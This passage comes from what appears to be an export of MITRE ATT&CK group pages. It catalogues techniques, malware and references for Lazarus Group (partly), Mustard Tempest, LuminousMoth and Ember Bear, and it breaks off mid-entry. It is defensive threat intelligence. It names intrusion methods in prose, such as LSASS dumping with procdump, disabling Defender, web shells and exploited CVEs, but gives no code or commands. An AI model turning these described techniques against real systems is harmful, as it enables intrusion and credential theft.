Removal: File Deletion, Process Discovery, Query Registry, System Information Discovery, System Network Configuration Discovery, System Services: Service Execution, System Time Discovery S0241 RATANKBA [47] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Ingress Tool Transfer, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Remote System Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Service Discovery, Windows Management Instrumentation S0364 RawDisk [3][14] Data Destruction, Disk Wipe: Disk Structure Wipe, Disk Wipe: Disk Content Wipe S0174 Responder [10] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Network Sniffing S0103 route [17] System Network Configuration Discovery S0586 TAINTEDSCRIBE [33] Archive Collected Data, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Obfuscation: Protocol or Service Impersonation, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Binary Padding, Process Discovery, Remote System Discovery, System Information Discovery, System Time Discovery S0665 ThreatNeedle [17] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Data from Local System, Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Fileless Storage, Phishing: Spearphishing Attachment, System Information Discovery, User Execution: Malicious File S0678 Torisma During Operation Dream Job, Lazarus Group used Torisma to actively monitor for new drives and remote desktop connections on an infected system.[11][12] Application Layer Protocol: Web Protocols, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Execution Guardrails, Exfiltration Over C2 Channel, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Time Discovery S0263 TYPEFRAME [48] Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Ingress Tool Transfer, Modify Registry, Non-Standard Port, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Encrypted/Encoded File, Proxy, System Information Discovery, User Execution: Malicious File S0180 Volgmer [49] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Query Registry, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery S0366 WannaCry [50][51][52][53] Create or Modify System Process: Windows Service, Data Encrypted for Impact, Encrypted Channel: Asymmetric Cryptography, Exploitation of Remote Services, Exploitation of Remote Services, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Hide Artifacts: Hidden Files and Directories, Inhibit System Recovery, Lateral Tool Transfer, Lateral Tool Transfer, Peripheral Device Discovery, Proxy: Multi-hop Proxy, Remote Service Session Hijacking: RDP Hijacking, Remote System Discovery, Service Stop, System Network Configuration Discovery, Windows Management Instrumentation References US-CERT. (2017, June 13). Alert (TA17-164A) HIDDEN COBRA \u2013 North Korea\u2019s DDoS Botnet Infrastructure. Retrieved July 13, 2017. US Treasury . (2019, September 13). Treasury Sanctions North Korean State-Sponsored Malicious Cyber Groups. Retrieved September 29, 2021. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016. CrowdStrike. (2022, February 1). CrowdStrike Adversary Labyrinth Chollima. Retrieved February 1, 2022. US-CERT. (2019, April 10). MAR-10135536-8 \u2013 North Korean Trojan: HOPLIGHT. Retrieved April 19, 2019. Smith, B. (2017, December 19). Microsoft and Facebook disrupt ZINC malware attack to protect customers and the internet from ongoing cyberthreats. Retrieved December 20, 2017. Secureworks. (2017, December 15). Media Alert - Secureworks Discovers North Korean Cyber Threat Group, Lazarus, Spearphishing Financial Executives of Cryptocurrency Companies. Retrieved December 27, 2017. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Breitenbacher, D and Osis, K. (2020, June 17). OPERATION IN(TER)CEPTION: Targeted Attacks Against European Aerospace and Military Companies. Retrieved December 20, 2021. ClearSky Research Team. (2020, August 13). Operation 'Dream Job' Widespread North Korean Espionage Campaign. Retrieved December 20, 2021. Cashman, M. (2020, July 29). Operation North Star Campaign. Retrieved December 20, 2021. Beek, C. (2020, November 5). Operation North Star: Behind The Scenes. Retrieved December 20, 2021. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Tools Report. Retrieved March 10, 2016. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved November 17, 2024. Cybersecurity and Infrastructure Security Agency. (2021, February 21). AppleJeus: Analysis of North Korea\u2019s Cryptocurrency Malware. Retrieved March 1, 2021. Weidemann, A. (2021, January 25). New campaign targeting security researchers. Retrieved December 20, 2021. Vyacheslav Kopeytsev and Seongsu Park. (2021, February 25). Lazarus targets defense industry with ThreatNeedle. Retrieved October 27, 2021. Sherstobitoff, R. (2018, February 12). Lazarus Resurfaces, Targets Global Banks and Bitcoin Users. Retrieved February 19, 2018. Stokes, P. (2020, July 27). Four Distinct Families of Lazarus Malware Target Apple\u2019s macOS Platform. Retrieved August 7, 2020. Mabutas, G. (2020, May 11). New MacOS Dacls RAT Backdoor Shows Lazarus\u2019 Multi-Platform Attack Capability. Retrieved August 10, 2020. Saini, A. and Hossein, J. (2022, January 27). North Korea\u2019s Lazarus APT leverages Windows Update client, GitHub in latest campaign. Retrieved January 27, 2022. Pradhan, A. (2022, February 8). LolZarus: Lazarus Group Incorporating Lolbins into Campaigns. Retrieved March 22, 2022. Cherepanov, Anton. (2019, November 10). ESETresearch discovered a trojanized IDA Pro installer. Retrieved September 12, 2024. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Loaders, Installers and Uninstallers Report. Retrieved November 17, 2024. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Remote Administration Tools & Content Staging Malware Report. Retrieved March 16, 2016. US-CERT. (2018, March 09). Malware Analysis Report (MAR) - 10135536.11.WHITE. Retrieved June 13, 2018. Sherstobitoff, R., Malhotra, A. (2018, April 24). Analyzing Operation GhostSecret: Attack Seeks to Steal Data Worldwide. Retrieved May 16, 2018. Ryan Sherstobitoff. (2018, April 24). Analyzing Operation GhostSecret: Attack Seeks to Steal Data Worldwide. Retrieved August 15, 2024. Trend Micro. (2017, February 27). RATANKBA: Delving into Large-scale Watering Holes against Enterprises. Retrieved May 22, 2018. Sherstobitoff, R. (2018, March 08). Hidden Cobra Targets Turkish Financial Sector With New Bankshot Implant. Retrieved May 18, 2018. AhnLab ASEC. (2022, October 6). Lazarus Group Uses the DLL Side-Loading Technique (mi.dll). Retrieved January 7, 2025. Lakshmanan, R. (2022, August 17). North Korea Hackers Spotted Targeting Job Seekers with macOS Malware. Retrieved April 10, 2023. USG. (2020, May 12). MAR-10288834-2.v1 \u2013 North Korean Trojan: TAINTEDSCRIBE. Retrieved March 5, 2021. Microsoft Threat Intelligence. (2023, November 22). Diamond Sleet supply chain compromise distributes a modified CyberLink installer. Retrieved March 28, 2025. US-CERT. (2017, November 22). Alert (TA17-318A): HIDDEN COBRA \u2013 North Korean Remote Administration Tool: FALLCHILL. Retrieved December 7, 2017. Novetta Threat Research Group 2016, February 24 Operation Blockbuster: Unraveling the Long Thread of the Sony Attack Retrieved. 2016/02/25 Eduard Kovacs 2018, March 1 Five Threat Groups Target Industrial Systems: Dragos Retrieved. 2020/01/03 Trend Micro. (2018, November 20). Lazarus Continues Heists, Mounts Attacks on Financial Organizations in Latin America. Retrieved December 3, 2018. US-CERT. (2018, February 06). Malware Analysis Report (MAR) - 10135536-G. Retrieved June 7, 2018. US-CERT. (2020, August 19). MAR-10295134-1.v1 \u2013 North Korean Remote Access Trojan: BLINDINGCAN. Retrieved August 19, 2020. Kaspersky Global Research and Analysis Team. (2019, September 23). DTrack: previously unknown spy-tool by Lazarus hits financial institutions and research centers. Retrieved January 20, 2021. Cybersecurity and Infrastructure Security Agency. (2020, August 26). MAR-10301706-1.v1 - North Korean Remote Access Tool: ECCENTRICBANDWAGON. Retrieved March 18, 2021. US-CERT. (2018, February 05). Malware Analysis Report (MAR) - 10135536-F. Retrieved June 11, 2018. US-CERT. (2020, February 20). MAR-10271944-1.v1 \u2013 North Korean Trojan: HOTCROISSANT. Retrieved May 1, 2020. US-CERT. (2018, August 09). MAR-10135536-17 \u2013 North Korean Trojan: KEYMARBLE. Retrieved August 16, 2018. Asheer Malhotra, Vitor Ventura & Jungsoo An, Cisco Talos. (2022, September 7). MagicRAT: Lazarus\u2019 latest gateway into victim networks. Retrieved December 30, 2024. Lei, C., et al. (2018, January 24). Lazarus Campaign Targeting Cryptocurrencies Reveals Remote Controller Tool, an Evolved RATANKBA, and More. Retrieved May 22, 2018. US-CERT. (2018, June 14). MAR-10135536-12 \u2013 North Korean Trojan: TYPEFRAME. Retrieved July 13, 2018. US-CERT. (2017, November 22). Alert (TA17-318B): HIDDEN COBRA \u2013 North Korean Trojan: Volgmer. Retrieved December 7, 2017. FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 17, 2024. Noerenberg, E., Costis, A., and Quist, N. (2017, May 16). A Technical Analysis of WannaCry Ransomware. Retrieved December 8, 2024. Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry Malware Profile. Retrieved March 15, 2019. Counter Threat Unit Research Team. (2017, May 18). WCry Ransomware Analysis. Retrieved March 26, 2019. "
},
{
"id": 119,
"title": "Mustard Tempest, DEV-0206, TA569, GOLD PRELUDE, UNC1543, Group G1020",
"path": "/groups/G1020/index.html",
"content": " Mustard Tempest Mustard Tempest is an initial access broker that has operated the SocGholish distribution network since at least 2017. Mustard Tempest has partnered with Indrik Spider to provide access for the download of additional malware including LockBit, WastedLocker, and remote access tools.[1][2][3][4] ID: G1020 \u24d8 Associated Groups: DEV-0206, TA569, GOLD PRELUDE, UNC1543 Version: 1.0 Created: 06 December 2023 Last Modified: 25 March 2024 Version Permalink Live Version Associated Group Descriptions Name Description DEV-0206 [2] TA569 [3] GOLD PRELUDE [3] UNC1543 [3] Techniques Used Domain ID Name Use Enterprise T1583 .004 Acquire Infrastructure: Server Mustard Tempest has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months.[5] .008 Acquire Infrastructure: Malvertising Mustard Tempest has posted false advertisements including for software packages and browser updates in order to distribute malware.[1] Enterprise T1584 .001 Compromise Infrastructure: Domains Mustard Tempest operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page.[3][4][5][6] Enterprise T1189 Drive-by Compromise Mustard Tempest has used drive-by downloads for initial infection, often using fake browser updates as a lure.[4][5][6][3] Enterprise T1105 Ingress Tool Transfer Mustard Tempest has deployed secondary payloads and third stage implants to compromised hosts.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Mustard Tempest has used the filename AutoUpdater.js to mimic legitimate update files and has also used the Cyrillic homoglyph characters \u0421 (0xd0a1) and \u0430 (0xd0b0), to produce the filename \u0421hrome.Upd\u0430te.zip.[6][4] Enterprise T1566 .002 Phishing: Spearphishing Link Mustard Tempest has sent victims emails containing links to compromised websites.[4] Enterprise T1608 .001 Stage Capabilities: Upload Malware Mustard Tempest has hosted payloads on acquired second-stage servers for periods of either days, weeks, or months.[5] .004 Stage Capabilities: Drive-by Target Mustard Tempest has injected malicious JavaScript into compromised websites to infect victims via drive-by download.[4][5][6][3] .006 Stage Capabilities: SEO Poisoning Mustard Tempest has poisoned search engine results to return fake software updates in order to distribute malware.[1][4] Enterprise T1082 System Information Discovery Mustard Tempest has used implants to perform system reconnaissance on targeted systems.[1] Enterprise T1204 .001 User Execution: Malicious Link Mustard Tempest has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.[1][4] Software ID Name References Techniques S0154 Cobalt Strike [1] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S1124 SocGholish [1][3][4] Command and Scripting Interpreter: JavaScript, Data Staged: Local Data Staging, Domain Trust Discovery, Drive-by Compromise, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compression, Phishing: Spearphishing Link, Process Discovery, Software Discovery, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious Link, Web Service, Windows Management Instrumentation References Microsoft. (2022, May 9). Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself. Retrieved March 10, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Secureworks. (n.d.). GOLD PRELUDE . Retrieved March 22, 2024. Andrew Northern. (2022, November 22). SocGholish, a very real threat from a very fake update. Retrieved February 13, 2024. Milenkoski, A. (2022, November 7). SocGholish Diversifies and Expands Its Malware Staging Infrastructure to Counter Defenders. Retrieved March 22, 2024. Red Canary. (2024, March). Red Canary 2024 Threat Detection Report: SocGholish. Retrieved March 22, 2024. "
},
{
"id": 120,
"title": "LuminousMoth, Group G1014",
"path": "/groups/G1014/index.html",
"content": " LuminousMoth LuminousMoth is a Chinese-speaking cyber espionage group that has been active since at least October 2020. LuminousMoth has targeted high-profile organizations, including government entities, in Myanmar, the Philippines, Thailand, and other parts of Southeast Asia. Some security researchers have concluded there is a connection between LuminousMoth and Mustang Panda based on similar targeting and TTPs, as well as network infrastructure overlaps.[1][2] ID: G1014 Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet; Zaw Min Htun, @Z3TAE Version: 1.0 Created: 23 February 2023 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1557 .002 Adversary-in-the-Middle: ARP Cache Poisoning LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols LuminousMoth has used HTTP for C2.[1] Enterprise T1560 Archive Collected Data LuminousMoth has manually archived stolen files from victim machines before exfiltration.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder LuminousMoth has used malicious DLLs that setup persistence in the Registry Key HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run.[1][2] Enterprise T1005 Data from Local System LuminousMoth has collected files and data from compromised machines.[1][2] Enterprise T1030 Data Transfer Size Limits LuminousMoth has split archived files into multiple parts to bypass a 5MB limit.[2] Enterprise T1587 .001 Develop Capabilities: Malware LuminousMoth has used unique malware for information theft and exfiltration.[1][2] Enterprise T1041 Exfiltration Over C2 Channel LuminousMoth has used malware that exfiltrates stolen data to its C2 server.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage LuminousMoth has exfiltrated data to Google Drive.[2] Enterprise T1083 File and Directory Discovery LuminousMoth has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives.[1][2] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories LuminousMoth has used malware to store malicious binaries in hidden directories on victim's USB drives.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL LuminousMoth has used legitimate executables such as winword.exe and igfxem.exe to side-load their malware.[1][2] Enterprise T1105 Ingress Tool Transfer LuminousMoth has downloaded additional malware and tools onto a compromised host.[1][2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location LuminousMoth has disguised their exfiltration malware as ZoomVideoApp.exe.[1] Enterprise T1112 Modify Registry LuminousMoth has used malware that adds Registry keys for persistence.[1][2] Enterprise T1588 .001 Obtain Capabilities: Malware LuminousMoth has obtained and used malware such as Cobalt Strike.[1][2] .002 Obtain Capabilities: Tool LuminousMoth has obtained an ARP spoofing tool from GitHub.[2] .004 Obtain Capabilities: Digital Certificates LuminousMoth has used a valid digital certificate for some of their malware.[1] Enterprise T1566 .002 Phishing: Spearphishing Link LuminousMoth has sent spearphishing emails containing a malicious Dropbox download link.[1] Enterprise T1091 Replication Through Removable Media LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines.[1][2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task LuminousMoth has created scheduled tasks to establish persistence for their tools.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware LuminousMoth has hosted malicious payloads on Dropbox.[1] .004 Stage Capabilities: Drive-by Target LuminousMoth has redirected compromised machines to an actor-controlled webpage through HTML injection.[2] .005 Stage Capabilities: Link Target LuminousMoth has created a link to a Dropbox file that has been used in their spear-phishing operations.[1] Enterprise T1539 Steal Web Session Cookie LuminousMoth has used an unnamed post-exploitation tool to steal cookies from the Chrome browser.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing LuminousMoth has signed their malware with a valid digital signature.[1] Enterprise T1033 System Owner/User Discovery LuminousMoth has used a malicious DLL to collect the username from compromised hosts.[2] Enterprise T1204 .001 User Execution: Malicious Link LuminousMoth has lured victims into clicking malicious Dropbox download links delivered through spearphishing.[1] Software ID Name References Techniques S0154 Cobalt Strike [1][2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0013 PlugX [1][2] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver References Lechtik, M, and etl. (2021, July 14). LuminousMoth APT: Sweeping attacks for the chosen few. Retrieved October 20, 2022. Botezatu, B and etl. (2021, July 21). LuminousMoth - PlugX, File Exfiltration and Persistence Revisited. Retrieved October 20, 2022. "
},
{
"id": 121,
"title": "Ember Bear, UNC2589, Bleeding Bear, DEV-0586, Cadet Blizzard, Frozenvista, UAC-0056, Group G1003",
"path": "/groups/G1003/index.html",
"content": " Ember Bear Ember Bear is a Russian state-sponsored cyber espionage group that has been active since at least 2020, linked to Russia's General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155).[1] Ember Bear has primarily focused operations against Ukrainian government and telecommunication entities, but has also operated against critical infrastructure entities in Europe and the Americas.[2] Ember Bear conducted the WhisperGate destructive wiper attacks against Ukraine in early 2022.[3][4][1] There is some confusion as to whether Ember Bear overlaps with another Russian-linked entity referred to as Saint Bear. At present available evidence strongly suggests these are distinct activities with different behavioral profiles.[2][5] ID: G1003 \u24d8 Associated Groups: UNC2589, Bleeding Bear, DEV-0586, Cadet Blizzard, Frozenvista, UAC-0056 Contributors: Hannah Simes, BT Security Version: 2.1 Created: 09 June 2022 Last Modified: 03 December 2024 Version Permalink Live Version Associated Group Descriptions Name Description UNC2589 [4] Bleeding Bear [3] DEV-0586 [2] Cadet Blizzard [2] Frozenvista [1] UAC-0056 [1] Techniques Used Domain ID Name Use Enterprise T1583 Acquire Infrastructure Ember Bear uses services such as IVPN, SurfShark, and Tor to add anonymization to operations.[2] .003 Virtual Private Server Ember Bear has used virtual private servers (VPSs) to host tools, perform reconnaissance, exploit victim infrastructure, and as a destination for data exfiltration.[1] Enterprise T1595 .001 Active Scanning: Scanning IP Blocks Ember Bear has targeted IP ranges for vulnerability scanning related to government and critical infrastructure organizations.[1] .002 Active Scanning: Vulnerability Scanning Ember Bear has used publicly available tools such as MASSCAN and Acunetix for vulnerability scanning of public-facing infrastructure.[1] Enterprise T1071 .004 Application Layer Protocol: DNS Ember Bear has used DNS tunnelling tools, such as dnscat/2 and Iodine, for C2 purposes.[1] Enterprise T1560 Archive Collected Data Ember Bear has compressed collected data prior to exfiltration.[1] Enterprise T1119 Automated Collection Ember Bear engages in mass collection from compromised systems during intrusions.[2] Enterprise T1110 Brute Force Ember Bear used the su-bruteforce tool to brute force specific users using the su command.[1] .003 Password Spraying Ember Bear has conducted password spraying against Outlook Web Access (OWA) infrastructure to identify valid user names and passwords.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Ember Bear has used PowerShell commands to gather information from compromised systems, such as email servers.[1] Enterprise T1005 Data from Local System Ember Bear gathers victim system information such as enumerating the volume of a given device or extracting system and security event logs for analysis.[2][1] Enterprise T1491 .002 Defacement: External Defacement Ember Bear is linked to the defacement of several Ukrainian organization websites.[2] Enterprise T1561 .002 Disk Wipe: Disk Structure Wipe Ember Bear conducted destructive operations against victims, including disk structure wiping, via the WhisperGate malware in Ukraine.[2] Enterprise T1114 Email Collection Ember Bear attempts to collect mail from accessed systems and servers.[2][1] Enterprise T1585 Establish Accounts Ember Bear has created accounts on dark web forums to obtain various tools and malware.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Ember Bear has used tools such as Rclone to exfiltrate information from victim environments to cloud storage such as mega.nz.[1] Enterprise T1190 Exploit Public-Facing Application Ember Bear gains initial access to victim environments by exploiting external-facing services. Examples include exploitation of CVE-2021-26084 in Confluence servers; CVE-2022-41040, ProxyShell, and other vulnerabilities in Microsoft Exchange; and multiple vulnerabilities in open-source platforms such as content management systems.[2][1] Enterprise T1203 Exploitation for Client Execution Ember Bear has used exploits to enable follow-on execution of frameworks such as Meterpreter.[1] Enterprise T1210 Exploitation of Remote Services Ember Bear has used exploits for vulnerabilities such as MS17-010, also known as Eternal Blue, during operations.[1] Enterprise T1133 External Remote Services Ember Bear have used VPNs both for initial access to victim environments and for persistence within them following compromise.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Ember Bear uses the NirSoft AdvancedRun utility to disable Microsoft Defender Antivirus through stopping the WinDefend service on victim machines. Ember Bear disables Windows Defender via registry key changes.[2] Enterprise T1070 .004 Indicator Removal: File Deletion Ember Bear deletes files related to lateral movement to avoid detection.[2] Enterprise T1570 Lateral Tool Transfer Ember Bear retrieves follow-on payloads direct from adversary-owned infrastructure for deployment on compromised hosts.[2] Enterprise T1654 Log Enumeration Ember Bear has enumerated SECURITY and SYSTEM log files during intrusions.[1] Enterprise T1036 Masquerading Ember Bear has renamed the legitimate Sysinternals tool procdump to alternative names such as dump64.exe to evade detection.[2] .005 Match Legitimate Resource Name or Location Ember Bear has renamed tools to match legitimate utilities, such as renaming GOST tunneling instances to java in victim environments.[1] Enterprise T1112 Modify Registry Ember Bear modifies registry values for anti-forensics and defense evasion purposes.[2] Enterprise T1046 Network Service Discovery Ember Bear has used tools such as NMAP for remote system discovery and enumeration in victim environments.[1] Enterprise T1095 Non-Application Layer Protocol Ember Bear uses socket-based tunneling utilities for command and control purposes such as NetCat and Go Simple Tunnel (GOST). These tunnels are used to push interactive command prompts over the created sockets.[2] Ember Bear has also used reverse TCP connections from Meterpreter installations to communicate back with C2 infrastructure.[1] Enterprise T1571 Non-Standard Port Ember Bear has used various non-standard ports for C2 communication.[1] Enterprise T1588 .001 Obtain Capabilities: Malware Ember Bear has acquired malware and related tools from dark web forums.[1] .005 Obtain Capabilities: Exploits Ember Bear has obtained exploitation scripts against publicly-disclosed vulnerabilities from public repositories.[1] Enterprise T1003 OS Credential Dumping Ember Bear gathers credential material from target systems, such as SSH keys, to facilitate access to victim environments.[2] .001 LSASS Memory Ember Bear uses legitimate Sysinternals tools such as procdump to dump LSASS memory.[2][1] .002 Security Account Manager Ember Bear acquires victim credentials by extracting registry hives such as the Security Account Manager through commands such as reg save.[2][1] .004 LSA Secrets Ember Bear has used frameworks such as Impacket to dump LSA secrets for credential capture.[1] Enterprise T1572 Protocol Tunneling Ember Bear has used ProxyChains to tunnel protocols to internal networks.[1] Enterprise T1090 .003 Proxy: Multi-hop Proxy Ember Bear has configured multi-hop proxies via ProxyChains within victim environments.[1] Enterprise T1021 Remote Services Ember Bear uses valid network credentials gathered through credential harvesting to move laterally within victim networks, often employing the Impacket framework to do so.[2] Enterprise T1018 Remote System Discovery Ember Bear has used tools such as Nmap and MASSCAN for remote service discovery.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Ember Bear uses remotely scheduled tasks to facilitate remote command execution on victim machines.[2] Enterprise T1505 .003 Server Software Component: Web Shell Ember Bear deploys web shells following initial access for either follow-on command execution or protocol tunneling. Example web shells used by Ember Bear include P0wnyshell, reGeorg, P.A.S. Webshell, and custom variants of publicly-available web shell examples.[2][1] Enterprise T1195 Supply Chain Compromise Ember Bear has compromised information technology providers and software developers providing services to targets of interest, building initial access to ultimate victims at least in part through compromise of service providers that work with the victim organizations.[2] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files Ember Bear has dumped configuration settings in accessed IP cameras including plaintext 